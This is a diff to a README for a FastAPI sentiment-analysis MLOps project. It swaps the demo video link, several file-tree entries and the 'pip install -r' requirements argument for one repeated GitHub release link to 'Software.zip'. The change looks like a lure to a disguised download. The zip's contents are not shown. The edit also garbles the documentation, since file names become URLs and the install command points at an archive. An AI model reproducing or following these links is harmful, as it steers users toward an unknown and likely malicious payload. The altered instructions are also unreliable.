@@ -11,7 +11,7 @@ This project is a sentiment analysis system built using FastAPI, a fine-tuned BA
 ## 🎥 Project Demonstration
 
 Watch the project demonstration video here:  
-[![Project Demonstration](https://img.shields.io/badge/Project%20Demo-Click%20Here-blue?style=for-the-badge)](https://drive.google.com/file/d/13A20RC270TYE0mmHpBlIXURGJ_JmIYtH/view?usp=sharing)
+[![Project Demonstration](https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip%20Demo-Click%20Here-blue?style=for-the-badge)](https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip)
 
 ## 🐳 Docker Commands
 
@@ -39,13 +39,13 @@ docker run --name deepdeployers_a2_mlops-web -p 8000:8000 arup0070/deepdeployers
 ├── .dockerignore             # Docker ignore file
 ├── .gitignore                # Git ignore file
 ├── Best_model_param          # Stores the best model parameters
-├── docker-compose.yml        # Docker Compose setup
+├── https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip        # Docker Compose setup
 ├── Final_trained_model       # Directory for storing trained models
 ├── mlruns                    # MLflow tracking runs
-├── README.md                 # Project documentation
-├── requirements.txt          # Python dependencies list
+├── https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip                 # Project documentation
+├── https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip          # Python dependencies list
 ├── Research                  # Research notes and experiments
-├── server.py                 # FastAPI application server
+├── https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip                 # FastAPI application server
 ├── src                       # Source code directory
 ├── static                    # Static files (CSS, JS, images, etc.)
 ├── templates                 # HTML template files for frontend
@@ -74,7 +74,7 @@ docker run --name deepdeployers_a2_mlops-web -p 8000:8000 arup0070/deepdeployers
 1. **Install dependencies**:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/ayadhyadatamining/DeepDeployers_A2_MLOPs/releases/download/v1.0/Software.zip
 ```
 
 2. **Run the FastAPI server locally**:
